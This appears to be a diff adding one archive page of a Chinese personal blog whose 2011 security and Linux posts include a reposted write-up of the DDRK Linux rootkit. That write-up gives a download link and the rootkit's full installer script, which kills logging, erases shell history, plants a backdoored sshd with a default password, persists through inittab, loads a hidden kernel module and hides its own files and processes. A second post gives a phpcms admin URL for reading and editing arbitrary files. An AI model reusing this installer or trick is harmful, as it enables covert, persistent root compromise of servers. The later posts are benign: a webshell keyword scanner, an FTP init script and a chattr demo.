@@ -1,0 +1,631 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>key1088 blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="个人博客网站">
+<meta property="og:type" content="website">
+<meta property="og:title" content="key1088 blog">
+<meta property="og:url" content="https://key1088.github.io/page/11/index.html">
+<meta property="og:site_name" content="key1088 blog">
+<meta property="og:description" content="个人博客网站">
+<meta property="og:locale">
+<meta property="article:author" content="key1088">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="key1088 blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">key1088 blog</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">2020到2060会发生什么，这40年内会有哪些变化呢</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/about">About</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Suche"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Suche"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://key1088.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-Linux下rootkit-ddrk攻击获得root权限以及清除方法[转]" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2011/06/27/Linux%E4%B8%8Brootkit-ddrk%E6%94%BB%E5%87%BB%E8%8E%B7%E5%BE%97root%E6%9D%83%E9%99%90%E4%BB%A5%E5%8F%8A%E6%B8%85%E9%99%A4%E6%96%B9%E6%B3%95%5B%E8%BD%AC%5D/" class="article-date">
+  <time class="dt-published" datetime="2011-06-27T03:10:00.000Z" itemprop="datePublished">2011-06-27</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2011/06/27/Linux%E4%B8%8Brootkit-ddrk%E6%94%BB%E5%87%BB%E8%8E%B7%E5%BE%97root%E6%9D%83%E9%99%90%E4%BB%A5%E5%8F%8A%E6%B8%85%E9%99%A4%E6%96%B9%E6%B3%95%5B%E8%BD%AC%5D/">Linux下rootkit-ddrk攻击获得root权限以及清除方法[转]</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p></p><p></p><p></p><p>DDRK是一个Linux结合shv和adore-ng优点，内核级别的rootkit。</p><p>DDRK中包含的文件：</p><p>netstat &nbsp;#替换系统中的netstat，从ssh配置文件中读取端口并隐藏</p><p>rk.ko &nbsp;#内核模块，实现文件和进程的隐藏功能</p><p>setup &nbsp;#rootkit安装文件</p><p>tty &nbsp;#ava工具</p><p>bin.tgz</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;---ttymon</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;---sshd.tgz</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;---.sh</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ---shdcf2 &nbsp;#sshd配置文件</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ---shhk</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ---shhk.pub</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ---shrs</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ---sshd &nbsp;#sshd主程序</p><p>DDRK下载地址：http://www.sectop.com/soft/ddrk.tgz</p><p>因此只要把这些文件上传到服务器上并成功运行，就可以获得该服务器的root权限。为所欲为，无所不能。</p><p>&nbsp;</p><p>setup内容如下：</p><p>#!/bin/bash</p><p>&nbsp;</p><p>##########define variables##########</p><p>DEFPASS=123456 &nbsp; &nbsp;//默认密码</p><p>DEFPORT=43958 &nbsp; &nbsp;//默认端口</p><p>BASEDIR=`pwd`</p><p>SSHDIR=/lib/libsh.so</p><p>HOMEDIR=/usr/lib/libsh</p><p>&nbsp;</p><p>unset HISTFILE;unset HISTSIZE;unset HISTORY;unset HISTSAVE;unset HISTFILESIZE</p><p>export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin</p><p>&nbsp;</p><p>##########check is root##########</p><p>if [ &quot;$(whoami)&quot; != &quot;root&quot; ]; then</p><p>&nbsp; &nbsp;echo &quot;BECOME ROOT AND TRY AGAIN&quot;</p><p>&nbsp; &nbsp;echo &quot;&quot;</p><p>&nbsp; &nbsp;exit</p><p>fi</p><p>&nbsp;</p><p>##########extract all tar##########</p><p>tar zxf bin.tgz</p><p>cd bin</p><p>tar zxf sshd.tgz</p><p>rm -rf ./sshd.tgz</p><p>cd $BASEDIR</p><p>rm -rf bin.tgz</p><p>cd $BASEDIR</p><p>&nbsp;</p><p>##########kill syslogd##########</p><p>killall -9 syslogd &gt;/dev/null 2&gt;&amp;1</p><p>sleep 2</p><p>&nbsp;</p><p>##########remove sh.conf##########</p><p>if [ -f /etc/sh.conf ]; then</p><p>&nbsp; rm -rf /etc/sh.conf &nbsp; &nbsp; &nbsp; &nbsp; //经过md5sum加密过的密码文件</p><p>fi</p><p>&nbsp;</p><p>##########initialize sshd configuration##########</p><p>if test -n &quot;$1&quot; ; then</p><p>&nbsp; &nbsp;echo &quot;Using Password : $1&quot;</p><p>&nbsp; &nbsp;cd $BASEDIR/bin</p><p>&nbsp; &nbsp;echo -n $1|md5sum &gt; /etc/sh.conf</p><p>else</p><p>&nbsp; &nbsp;echo &quot;No Password Specified, using default - $DEFPASS&quot;</p><p>&nbsp; &nbsp;echo -n $DEFPASS|md5sum &gt; /etc/sh.conf</p><p>fi</p><p>&nbsp;</p><p>&nbsp;</p><p>touch -acmr /bin/ls /etc/sh.conf</p><p>chown -f root:root /etc/sh.conf</p><p>&nbsp;</p><p>if test -n &quot;$2&quot; ; then</p><p>&nbsp; &nbsp;echo &quot;Using ssh-port : $2&quot;</p><p>&nbsp; &nbsp;echo &quot;Port $2&quot; &gt;&gt; $BASEDIR/bin/.sh/sshd_config</p><p>&nbsp; &nbsp;cat $BASEDIR/bin/.sh/shdcf2 &gt;&gt; $BASEDIR/bin/.sh/sshd_config ; rm -rf $BASEDIR/bin/.sh/shdcf2</p><p>&nbsp; &nbsp;mv $BASEDIR/bin/.sh/sshd_config $BASEDIR/bin/.sh/shdcf</p><p>else</p><p>&nbsp; &nbsp;echo &quot;No ssh-port Specified, using default - $DEFPORT&quot;</p><p>&nbsp; &nbsp;echo &quot;Port $DEFPORT&quot; &gt;&gt; $BASEDIR/bin/.sh/sshd_config</p><p>&nbsp; &nbsp;cat $BASEDIR/bin/.sh/shdcf2 &gt;&gt; $BASEDIR/bin/.sh/sshd_config ; rm -rf $BASEDIR/bin/.sh/shdcf2</p><p>&nbsp; &nbsp;mv $BASEDIR/bin/.sh/sshd_config $BASEDIR/bin/.sh/shdcf</p><p>fi</p><p>&nbsp;</p><p>###########creating dirs##########</p><p>SSHDIR=/lib/libsh.so</p><p>HOMEDIR=/usr/lib/libsh</p><p>&nbsp;</p><p>if [ -d /lib/libsh.so ]; then</p><p>&nbsp; &nbsp;rm -rf /lib/libsh.so</p><p>fi</p><p>&nbsp;</p><p>if [ -d /usr/lib/libsh ]; then</p><p>&nbsp; &nbsp;rm -rf /usr/lib/libsh/*</p><p>fi</p><p>&nbsp;</p><p>mkdir $SSHDIR</p><p>touch -acmr /bin/ls $SSHDIR</p><p>mkdir $HOMEDIR</p><p>touch -acmr /bin/ls $HOMEDIR</p><p>&nbsp;</p><p>cd $BASEDIR/bin</p><p>mv .sh/* $SSHDIR/</p><p>mv .sh/.bashrc $HOMEDIR</p><p>&nbsp;</p><p>if [ -f /sbin/ttyload ]; then</p><p>&nbsp; &nbsp;chattr -AacdisSu /sbin/ttyload</p><p>&nbsp; &nbsp;rm -rf /sbin/ttyload</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/sbin/ttyload ]; then</p><p>&nbsp; &nbsp;rm -rf /usr/sbin/ttyload</p><p>fi</p><p>&nbsp;</p><p>if [ -f /sbin/ttymon ]; then</p><p>&nbsp; &nbsp;rm -rf /sbin/ttymon</p><p>fi</p><p>&nbsp;</p><p>mv $SSHDIR/sshd /sbin/ttyload</p><p>chmod a+xr /sbin/ttyload</p><p>chmod o-w /sbin/ttyload</p><p>touch -acmr /bin/ls /sbin/ttyload</p><p>kill -9 `pidof ttyload` &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>mv $BASEDIR/bin/ttymon /sbin/ttymon</p><p>chmod a+xr /sbin/ttymon</p><p>touch -acmr /bin/ls /sbin/ttymon</p><p>kill -9 `pidof ttymon` &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>cp /bin/bash $SSHDIR</p><p>&nbsp;</p><p>##########modify inittab##########</p><p>cp /etc/inittab /etc/.inittab</p><p>sed -e 's@^1:2345@0:2345:once:/usr/sbin/ttyloadn&amp;@' /etc/inittab &gt; /etc/.inittab</p><p>touch -acmr /etc/inittab /etc/.inittab</p><p>mv -f /etc/.inittab /etc/inittab</p><p>&nbsp;</p><p>echo &quot;/sbin/ttyload -q &gt; /dev/null 2&gt;&amp;1&quot; &gt; /usr/sbin/ttyload</p><p>echo &quot;/sbin/ttymon &gt; /dev/null 2&gt;&amp;1&quot; &gt;&gt; /usr/sbin/ttyload</p><p>echo &quot;${HOMEDIR}/tty i `pidof ttyload` &gt; /dev/null 2&gt;&amp;1&quot; &gt;&gt; /usr/sbin/ttyload</p><p>echo &quot;${HOMEDIR}/tty i `pidof ttymon` &gt; /dev/null 2&gt;&amp;1&quot; &gt;&gt; /usr/sbin/ttyload</p><p>&nbsp;</p><p>touch -acmr /bin/ls /usr/sbin/ttyload</p><p>chmod 755 /usr/sbin/ttyload</p><p>/usr/sbin/ttyload &gt; /dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>touch -amcr /bin/ls /etc/inittab</p><p>&nbsp;</p><p>###########make sure inittab has modified##########</p><p>&nbsp;</p><p>if [ ! &quot;`grep ttyload /etc/inittab`&quot; ]; then</p><p>&nbsp; &nbsp;echo &quot;# WARNING - SSHD WONT BE RELOADED UPON RESTART &quot;</p><p>&nbsp; &nbsp;echo &quot;# inittab shuffling probly fucked-up ! &quot;</p><p>fi</p><p>&nbsp;</p><p>##########load rk.ko##########</p><p>cd $BASEDIR</p><p>modprobe -r ehci-hcd</p><p>mv -f rk.ko /lib/modules/`uname -r`/kernel/drivers/usb/host/ehci-hcd.ko</p><p>modprobe ehci-hcd</p><p>mv tty $HOMEDIR</p><p>&nbsp;</p><p>##########replace netstat##########</p><p>touch -acmr /bin/netstat netstat</p><p>mv -f netstat /bin/netstat</p><p>&nbsp;</p><p>##########hide all files and process##########</p><p>$HOMEDIR/tty h /etc/sh.conf &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty h /lib/libsh.so &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty h /usr/lib/libsh &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty h /sbin/ttyload &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty h /usr/sbin/ttyload &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty h /sbin/ttymon &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty i `pidof ttyload` &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty i `pidof ttymon` &gt; /dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>##########load rk.ko on boot##########</p><p>cat &gt; /etc/sysconfig/modules/ehci.modules &lt;&lt; EOF</p><p>#!/bin/sh</p><p>#install usb modules support</p><p>modprobe -r ehci-hcd</p><p>modprobe ehci-hcd</p><p>EOF</p><p>touch -amcr /bin/ls /etc/sysconfig/modules/ehci.modules</p><p>&nbsp;</p><p>chmod 755 /etc/sysconfig/modules/ehci.modules</p><p>$HOMEDIR/tty h /etc/sysconfig/modules/ehci.modules &gt; /dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>##########check iptables setting##########</p><p>if [ -f /sbin/iptables ]; then</p><p>&nbsp; &nbsp;echo &quot;`/sbin/iptables -L INPUT | head -5`&quot;</p><p>else</p><p>&nbsp; &nbsp;echo &quot;&quot;</p><p>&nbsp; &nbsp;echo &quot;# lucky for u no iptables found&quot;</p><p>fi</p><p>&nbsp;</p><p>##########start syslogd##########</p><p>/sbin/syslogd -m 0</p><p>&nbsp;</p><p># ./setup 123 3333 &nbsp; &nbsp;//设
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://key1088.github.io/2011/06/27/Linux%E4%B8%8Brootkit-ddrk%E6%94%BB%E5%87%BB%E8%8E%B7%E5%BE%97root%E6%9D%83%E9%99%90%E4%BB%A5%E5%8F%8A%E6%B8%85%E9%99%A4%E6%96%B9%E6%B3%95[%E8%BD%AC]/" data-id="clgrjlxhu00477opi1fdt6zhc" data-title="Linux下rootkit-ddrk攻击获得root权限以及清除方法[转]" class="article-share-link">Teilen</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-php2008漏洞后台上传0day漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2011/06/23/php2008%E6%BC%8F%E6%B4%9E%E5%90%8E%E5%8F%B0%E4%B8%8A%E4%BC%A00day%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time class="dt-published" datetime="2011-06-23T08:45:00.000Z" itemprop="datePublished">2011-06-23</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2011/06/23/php2008%E6%BC%8F%E6%B4%9E%E5%90%8E%E5%8F%B0%E4%B8%8A%E4%BC%A00day%E6%BC%8F%E6%B4%9E/">php2008漏洞后台上传0day漏洞</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>&nbsp;phpcms扫描木马功能，发现木马后，可以查看修改。</p><p>只要指定文件可以查看，可以修改，也可以创建，很厉害的功能。</p><p>利用地址：</p><p><a href="http://baidu.com/key1088" target="_blank" rel="noopener noreferrer">http://192.168.0.203/phpcms/admin.php?mod=phpcms&amp;file=safe&amp;action=see_code&amp;files=uploadfile/test.php</a></p><p><img src="/images/pic/c11a73f4fd77417d720eeca6.jpg" small="0" /><br /></p><p></p><p></p><p></p><p></p><p></p>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://key1088.github.io/2011/06/23/php2008%E6%BC%8F%E6%B4%9E%E5%90%8E%E5%8F%B0%E4%B8%8A%E4%BC%A00day%E6%BC%8F%E6%B4%9E/" data-id="clgrjlxir005t7opiah8971pd" data-title="php2008漏洞后台上传0day漏洞" class="article-share-link">Teilen</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-scan-webshell-shell" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2011/06/21/scan-webshell-shell/" class="article-date">
+  <time class="dt-published" datetime="2011-06-21T01:48:00.000Z" itemprop="datePublished">2011-06-21</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>►<a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Shell%E7%BC%96%E7%A8%8B/">Shell编程</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2011/06/21/scan-webshell-shell/">scan webshell shell</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>#!/bin/bash</p><p>#scan webshell shell</p><p>dire=/data// &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; # &nbsp; web path</p><p>exname=.php &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # &nbsp; .php; .jsp; .php3</p><p>key=eval &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# &nbsp; system; exec; base64_decode </p><p>page=$(find PATH -name &quot;*.php&quot; -type f )&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #这样效率会更高，修改用find</p><p>#page=$(du -a $dire|awk '{print $2}'|grep $exname)</p><p>for i in $page</p><p>do</p><p>test=$(cat $i |grep -i $key)</p><p>if [ ! -z &quot;$test&quot; ]</p><p>then</p><p>echo $i &gt;&gt; tmp &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#</p><p>fi</p><p>done</p><p>&nbsp;</p><p>网站被黑后，如果网站动态页面，很难一一搜索，通过搜索webshell 里面常用的关键词，来节省一段时间。</p><p>实现方法很简单，思路就是这样。</p><p>遍历整个目录下的文件，搜索特出关键词（webshell里面的敏感关键词），然后重定向到一个文件。在检查这些文件，就快的多了。</p><p>&nbsp;</p><p></p><p>&nbsp;</p><p></p>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://key1088.github.io/2011/06/21/scan-webshell-shell/" data-id="clgrjlxj4006g7opic5lsgev8" data-title="scan webshell shell" class="article-share-link">Teilen</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-vsftpd-服务脚本" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2011/06/20/vsftpd-%E6%9C%8D%E5%8A%A1%E8%84%9A%E6%9C%AC/" class="article-date">
+  <time class="dt-published" datetime="2011-06-20T07:04:00.000Z" itemprop="datePublished">2011-06-20</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Linux/">Linux</a>►<a class="article-category-link" href="/categories/Linux/Shell%E7%BC%96%E7%A8%8B/">Shell编程</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2011/06/20/vsftpd-%E6%9C%8D%E5%8A%A1%E8%84%9A%E6%9C%AC/">vsftpd 服务脚本</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>&nbsp;</p><p>#!/bin/bash</p><p>#by:key1088</p><p>#description:vsftpd</p><p>#conf:/etc/vsftpd/vsftp.conf</p><p>#cp vsftpd &nbsp;/etc/init.d/vsftpd</p><p>#chmod 755 /etc/init.d/vsftpd</p><p>#chkconfig --add vsftpd&nbsp;</p><p>#chkconfig vsftpd on</p><p>&nbsp;</p><p>&nbsp;</p><p>if [ -f /etc/init.d/functions ]&nbsp;</p><p>then</p><p>. /etc/init.d/functions</p><p>elif [ -f /etc/rc.d/init.d/functions ]</p><p>then</p><p>. /etc/rc.d/init.d/functions</p><p>else</p><p>exit 0</p><p>fi</p><p>vsftpd=/usr/local/sbin/vsftpd &nbsp; &nbsp; &nbsp;</p><p>ftpconf=/etc/vsftpd/vsftpd.conf</p><p>prog=vsftpd</p><p>RETVAL=0</p><p>start() {</p><p>&nbsp; &nbsp; &nbsp; &nbsp; if [ -n &quot;`/sbin/pidof $prog`&quot; ]</p><p>&nbsp; &nbsp; &nbsp; &nbsp; then</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; echo &quot;$prog: already running&quot; &nbsp; &nbsp; &nbsp;&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return 1</p><p>&nbsp; &nbsp; &nbsp; &nbsp; fi</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo &quot;Starting $prog:&quot;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; base=$prog</p><p>&nbsp; &nbsp; &nbsp; &nbsp; $vsftpd $ftpconf&amp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; if [ -z &quot;`/sbin/pidof $prog`&quot; ]</p><p>&nbsp; &nbsp; &nbsp; &nbsp; then</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RETVAL=1</p><p>&nbsp; &nbsp; &nbsp; &nbsp; fi</p><p>&nbsp; &nbsp; &nbsp; &nbsp; if [ $RETVAL -ne 0 ] &nbsp; &nbsp; &nbsp;&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; then</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo &quot;Startup failure&quot;&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; else</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo &quot;Startup success&quot; &nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; fi</p><p>&nbsp; &nbsp; &nbsp; &nbsp; return $RETVAL</p><p>}</p><p>&nbsp;</p><p>stop() {</p><p>if [ -z &quot;`/sbin/pidof $prog`&quot; ]</p><p>then</p><p>RETVAL=1</p><p>fi</p><p>if [ $RETVAL -ne 0 ]</p><p>then</p><p>echo &quot;vsftpd no have run&quot;</p><p>else</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo &quot;Stopping $prog:&quot;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; killall $vsftpd</p><p>&nbsp; &nbsp; &nbsp; &nbsp; RETVAL=$?</p><p>&nbsp; &nbsp; &nbsp; &nbsp; if [ $RETVAL -ne 0 ]</p><p>&nbsp; &nbsp; &nbsp; &nbsp; then</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo &quot;Shutdown failure&quot; &nbsp;&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; else</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo &quot;Shutdown success&quot; &nbsp; &nbsp;&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; fi</p><p>fi</p><p>}</p><p>&nbsp;</p><p>case &quot;$1&quot; in</p><p>start)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; start &nbsp; &nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ;;</p><p>stop)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; stop &nbsp;&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ;;</p><p>status)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; status $vsftpd</p><p>&nbsp; &nbsp; &nbsp; &nbsp; RETVAL=$? &nbsp; &nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ;;</p><p>restart)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; stop</p><p>&nbsp; &nbsp; &nbsp; &nbsp; start</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ;;</p><p>*)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo &quot;Usage: $prog {start|stop|restart|status}&quot;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; exit 1</p><p>esac</p><p>exit $RETVAL</p><br /><p></p>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://key1088.github.io/2011/06/20/vsftpd-%E6%9C%8D%E5%8A%A1%E8%84%9A%E6%9C%AC/" data-id="clgrjlxkb008n7opi91nahzik" data-title="vsftpd 服务脚本" class="article-share-link">Teilen</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-linux-文件、目录写保护" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2011/06/15/linux-%E6%96%87%E4%BB%B6%E3%80%81%E7%9B%AE%E5%BD%95%E5%86%99%E4%BF%9D%E6%8A%A4/" class="article-date">
+  <time class="dt-published" datetime="2011-06-15T02:55:00.000Z" itemprop="datePublished">2011-06-15</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Linux/">Linux</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2011/06/15/linux-%E6%96%87%E4%BB%B6%E3%80%81%E7%9B%AE%E5%BD%95%E5%86%99%E4%BF%9D%E6%8A%A4/">linux 文件、目录写保护</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>文件：</p><p>[root@book ~]# touch a.txt</p>[root@book ~]# chattr +i a.txt<br />[root@root&nbsp;~]# rm -f a.txt<br />rm: cannot remove `a.txt': Operation not permitted<br />[root@book ~]# ls<br />anaconda-ks.cfg a.txt Desktop &nbsp;install.log install.log.syslog<br />[root@book ~]# chattr -i a.txt<br />[root@book ~]# rm -f a.txt<br />[root@book ~]# ls<br />anaconda-ks.cfg Desktop &nbsp;install.log install.log.syslog<br /><p>&nbsp;</p><p>目录：</p>[root@root&nbsp;root]# mkdir test<br />[root@root&nbsp;root]# chattr +i test<br /><p>[root@root&nbsp;root]# rm -fr test</p><p>rm: cannot remove directory `test': Operation not permitted</p><p>&nbsp;</p><p></p>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://key1088.github.io/2011/06/15/linux-%E6%96%87%E4%BB%B6%E3%80%81%E7%9B%AE%E5%BD%95%E5%86%99%E4%BF%9D%E6%8A%A4/" data-id="clgrjlxha003w7opi8crl5lap" data-title="linux 文件、目录写保护" class="article-share-link">Teilen</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-浮躁的天，浮躁的我。" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2011/05/21/%E6%B5%AE%E8%BA%81%E7%9A%84%E5%A4%A9%EF%BC%8C%E6%B5%AE%E8%BA%81%E7%9A%84%E6%88%91%E3%80%82/" class="article-date">
+  <time class="dt-published" datetime="2011-05-21T04:53:00.000Z" itemprop="datePublished">2011-05-21</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%94%9F%E6%B4%BB%E6%84%9F%E6%83%B3/">生活感想</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2011/05/21/%E6%B5%AE%E8%BA%81%E7%9A%84%E5%A4%A9%EF%BC%8C%E6%B5%AE%E8%BA%81%E7%9A%84%E6%88%91%E3%80%82/">浮躁的天，浮躁的我。</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
